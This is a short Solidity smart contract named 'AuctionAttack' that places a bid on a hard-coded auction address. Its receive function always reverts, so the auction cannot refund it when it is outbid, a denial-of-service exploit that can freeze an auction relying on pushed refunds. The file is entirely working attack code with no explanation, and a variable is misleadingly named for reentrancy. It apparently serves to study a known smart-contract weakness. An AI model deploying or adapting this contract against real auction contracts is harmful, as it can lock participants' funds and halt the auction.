// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

contract AuctionAttack {
    
    address _reentrancy = 0xd9145CCE52D386f254917e481eB44e9943F39138; // <auction_address>;
    
    function attack() public payable {
        
        bytes4 selector = bytes4(keccak256("bid()"));
        
        bytes memory data = abi.encodeWithSelector(selector);
        
        (bool success, ) = _reentrancy.call{value: msg.value}(data);
        require(success);
    }
    
    receive() external payable {
        revert();
    }
}
